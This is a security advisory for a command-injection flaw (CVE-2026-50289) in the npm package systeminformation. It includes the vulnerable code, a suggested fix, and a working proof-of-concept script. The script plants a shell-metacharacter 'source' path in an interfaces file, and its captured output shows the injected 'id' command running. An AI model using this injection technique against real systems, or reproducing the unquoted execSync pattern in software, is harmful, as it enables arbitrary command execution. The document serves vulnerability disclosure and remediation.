# [H] systeminformation: OS command injection in networkInterfaces() via interfaces(5) source-directive path on Linux

## Summary
Severity: High
Advisory: GHSA-5xpp-75jx-m839
CVE: CVE-2026-50289
CWE: CWE-78
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-07-15
Source: https://github.com/advisories/GHSA-5xpp-75jx-m839
Type: github-advisory

## Affected
- npm: `systeminformation` — affected >=0 <5.31.7

## Details
### Summary

On Linux, `systeminformation`'s `networkInterfaces()` is vulnerable to OS command injection through the Debian/Ubuntu `interfaces(5)` `source` directive. While collecting per-interface DHCP state, the library reads `/etc/network/interfaces` and, for every `source <path>` line it encounters, extracts the path token *from the file content* and interpolates it **unquoted** into a shell command string that is run via `execSync()`. A `source` line whose path contains shell metacharacters executes arbitrary commands with the privileges of the calling Node.js process.

This is the same root-cause class as the previously-fixed NetworkManager-connection-name injection in this file: a value parsed out of local system state is re-interpolated into a shell command string without sanitization. The NetworkManager paths were converted to argument-array execution, but the `interfaces(5)` `source`-recursion sink in `checkLinuxDCHPInterfaces()` was left unfixed and still builds a shell string. The input to this sink is *unsanitized* (unlike the `iface`/`connectionName` paths, which pass through `util.sanitizeString` in strict mode before reaching their commands).

### Impact

An attacker who can place or influence a `source`d path in `/etc/network/interfaces` (or any file it transitively `source`s) achieves command execution inside any process that calls `networkInterfaces()`. Realistic affected deployments are the same ones that motivate this library:

- local inventory / asset agents
- monitoring and diagnostics agents
- admin-dashboard backends collecting host information
- device-management / desktop agents

If such a process runs with elevated privileges, the injected command runs with those privileges. `networkInterfaces()` is a core, frequently-called API and is reached transitively by `getStaticData()` / `getAllData()`, so the sink is exercised by ordinary usage on Linux.

### Threat model

The dangerous value is **not** a function argument supplied by the caller. It is read from the *content* of an `interfaces(5)` configuration file. The stock Debian/Ubuntu layout uses `source /etc/network/interfaces.d/*` and `source-directory` fan-out, so the parser routinely follows `source` directives into other files and re-parses their `source` lines. Any actor who can write a file that becomes reachable through that `source` chain — for example a lower-privileged process or configuration-management hook that drops a file into a `source`d directory, or a tool that materializes an interfaces snippet from semi-trusted input — controls the path token that lands in the shell command. No NetworkManager activation or special hardware is required; the only precondition is that one `source`d path string contains shell metacharacters.

### Vulnerable code

`lib/network.js`, `checkLinuxDCHPInterfaces()` (current `5.31.6` line numbers):

```js
// lib/network.js
function checkLinuxDCHPInterfaces(file) {
  let result = [];
  try {
    const cmd = `cat ${file} 2> /dev/null | grep 'iface\\|source'`;   // <-- unquoted ${file} -> shell sink
    const lines = execSync(cmd, util.execOptsLinux).toString().split('\n');

    lines.forEach((line) => {
      const parts = line.replace(/\s+/g, ' ').trim().split(' ');
      if (parts.length >= 4) {
        if (line.toLowerCase().indexOf(' inet ') >= 0 && line.toLowerCase().indexOf('dhcp') >= 0) {
          result.push(parts[1]);
        }
      }
      if (line.toLowerCase().includes('source')) {
        const file = line.split(' ')[1];                              // <-- path parsed FROM file content
        result = result.concat(checkLinuxDCHPInterfaces(file));        // <-- recurses, re-feeding attacker path
      }
    });
  } catch {
    util.noop();
  }
  return result;
}
```

`util.execOptsLinux` sets no `shell` option, so `execSync(cmd, util.execOptsLinux)` runs `cmd` through `/bin/sh`. The `${file}` token is interpolated raw — not quoted, not passed through `util.sanitizeString`/`sanitizeShellString` — so `;`, `$( )`, backticks, `|`, `&`, redirections, and even a bare space all break out of the intended `cat`/`grep` pipeline.

Reach chain to the public API:

```js
// lib/network.js, getLinuxDHCPNics()
result = checkLinuxDCHPInterfaces('/etc/network/interfaces');
```

```js
// lib/network.js, networkInterfaces() (Linux branch)
_dhcpNics = getLinuxDHCPNics();
```

`networkInterfaces()` is also reached by `getStaticData()` and `getAllData()` in `lib/index.js`.

### Reproduction

The PoC exercises the **verbatim shipped sink function** extracted from the installed `node_modules/systeminformation/lib/network.js` (version pinned to `5.31.6`), bound to the same `child_process.execSync` and shipped `util.execOptsLinux` the library uses. It then drives the exact `source`-recursion data flow with a malicious sourced path. A negative control with a benign path confirms no execution occurs on well-formed input.

Install the pinned vulnerable version:

```bash
mkdir si-poc && cd si-poc
npm init -y >/dev/null
npm install systeminformation@5.31.6
```

`poc.js`:

```js
const fs = require('fs');
const path = require('path');
const cp = require('child_process');
const libDir = path.join(__dirname, 'node_modules', 'systeminformation', 'lib');
const util = require(path.join(libDir, 'util.js'));

// Load the VERBATIM shipped sink function from the installed library source.
const src = fs.readFileSync(path.join(libDir, 'network.js'), 'utf8');
const m = src.match(/function checkLinuxDCHPInterfaces\(file\) \{[\s\S]*?\n\}\n/);
if (!m) { console.error('could not locate shipped function'); process.exit(2); }

// Bind the same free vars network.js binds: execSync + util.
const execSync = cp.execSync;
const checkLinuxDCHPInterfaces =
  new Function('execSync', 'util', m[0] + '\nreturn checkLinuxDCHPInterfaces;')(execSync, util);

// --- Malicious case: a sourced interfaces file with shell metacharacters in the path ---
const tmp = fs.mkdtempSync('/tmp/si-dhcp-');
const outer = path.join(tmp, 'interfaces');
const marker = path.join(tmp, 'PWNED');
const maliciousSource = `/dev/null;id>${marker};echo`;
fs.writeFileSync(outer, `auto lo\niface lo inet loopback\nsource ${maliciousSource}\n`);

console.log('PRE  marker_exists=' + fs.existsSync(marker));
const res = checkLinuxDCHPInterfaces(outer);   // == networkInterfaces() -> getLinuxDHCPNics() path
console.log('returned=' + JSON.stringify(res));
console.log('POST marker_exists=' + fs.existsSync(marker));
if (fs.existsSync(marker)) console.log('marker_contents=' + fs.readFileSync(marker, 'utf8').trim());

// --- Negative control: a benign sourced path must NOT execute anything ---
const tmp2 = fs.mkdtempSync('/tmp/si-neg-');
const outer2 = path.join(tmp2, 'interfaces');
const inner2 = path.join(tmp2, 'iface.d');
const marker2 = path.join(tmp2, 'PWNED_NEG');
fs.writeFileSync(inner2, 'iface eth0 inet dhcp\n');
fs.writeFileSync(outer2, `auto lo\nsource ${inner2}\n`);
console.log('\nNEG pre  marker_exists=' + fs.existsSync(marker2));
const res2 = checkLinuxDCHPInterfaces(outer2);
console.log('NEG returned=' + JSON.stringify(res2));
console.log('NEG post marker_exists=' + fs.existsSync(marker2));
```

Run it:

```bash
node poc.js
```

Verbatim captured output (against `systeminformation@5.31.6`):

```
PRE  marker_exists=false
returned=[]
POST marker_exists=true
marker_contents=uid=501(rick) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),701(com.apple.sharepoint.group.1),33(_appstore),98(_lpadmin),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh),400(com.apple.access_remote_ae)

NEG pre  marker_exists=false
NEG returned=["eth0"]
NEG post marker_exists=false
```

The malicious `source` path caused the injected `id` command to run (marker created, contents = the calling process identity), while the benign `source` path parsed normally (`["eth0"]`) and produced no marker. The injected command runs with the privileges of the Node.js process that called `networkInterfaces()`.

### End-to-end reproduction

The transcript above is the end-to-end run against the pinned published artifact `systeminformation@5.31.6`, loading the shipped `lib/network.js` and `lib/util.js` from `node_modules`. Exact commands:

```bash
mkdir si-poc && cd si-poc
npm init -y >/dev/null
npm install systeminformation@5.31.6
# place poc.js (from the Reproduction section) in this directory
node poc.js
```

The marker file `PWNED` is created only by the injected command path; the negative-control marker `PWNED_NEG` is never created. The verbatim captured stdout is shown in the Reproduction section above.

### Suggested fix

Stop building a shell string from a path that comes out of file content. Read the file with `fs` (no shell), or use argument-array execution, and never interpolate a parsed `source` path into a shell command. For example:

```js
function checkLinuxDCHPInterfaces(file) {
  let result = [];
  try {
    // No shell: read the file directly and filter in JS.
    const content = require('fs').readFileSync(file, { encoding: 'utf8' });
    const lines = content.split('\n').filter((l) => /iface|source/.test(l));
    lines.forEach((line) => {
      const parts = line.replace(/\s+/g, ' ').trim().split(' ');
      if (parts.length >= 4 &&
          line.toLowerCase().indexOf(' inet ') >= 0 &&
          line.toLowerCase().indexOf('dhcp') >= 0) {
        result.push(parts[1]);
      }
      if (line.toLowerCase().includes('source')) {
        const sourced = line.split(' ')[1];
        result = result.concat(checkLinuxDCHPInterfaces(sourced));
      }
    });
  } catch {
    require('./util').noop();
  }
  return result;
}
```

If shelling out is preferred, replace the `cat`/`grep` shell string with argument-array execution as shown below, so the path is passed as a single argv element and the shell never re-parses it:

```js
const { execFileSync } = require('child_process');
const content = execFileSync('cat', [file], util.execOptsLinux).toString();
```

Quoting alone is insufficient. Treat every value parsed from `interfaces(5)` files as untrusted even though it originates from local system state, consistent with the defensive `util.sanitizeString` pattern already applied to the interface name and NetworkManager connection name on the sibling paths.

### Fix PR

A fix is provided on a private temporary fork (not pushed to any public fork during the embargo). The branch replaces the `cat ${file}` shell string in `checkLinuxDCHPInterfaces()` with a non-shell `fs.readFileSync` read and adds a Linux regression test that points the function at an `interfaces` file containing a `source` directive with shell metacharacters and asserts that no side-effect command runs (no marker file is produced) while a benign sourced DHCP interface is still parsed.

### Credit

Reported by tonghuaroot.

## References
- https://github.com/sebhildebrandt/systeminformation/security/advisories/GHSA-5xpp-75jx-m839
- https://github.com/sebhildebrandt/systeminformation/commit/bbfddde48672d0ee124fefdb3cb4442fd9dd4f03
- https://github.com/sebhildebrandt/systeminformation
- https://github.com/sebhildebrandt/systeminformation/releases/tag/v5.31.7
